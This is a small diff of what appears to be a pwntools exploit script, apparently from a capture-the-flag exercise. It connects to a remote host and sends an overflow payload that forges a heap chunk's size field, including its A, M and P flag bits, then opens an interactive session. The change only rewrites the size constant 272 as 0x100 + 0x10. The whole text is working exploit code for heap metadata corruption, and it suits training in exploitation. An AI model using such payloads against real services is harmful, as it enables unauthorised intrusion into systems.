@@ -15,7 +15,7 @@ io = remote(HOST, PORT)
 
 payload = b'A' * 16 # buf_1::data
 payload += b'\x00' * 8 # buf_2::prev_size
-payload += p64(272 + 0b011) # buf_2::size + A,M,P-flag
+payload += p64((0x100 + 0x10) + 0b011) # buf_2::size + A,M,P-flag
 io.sendline(payload)
 
 io.interactive()
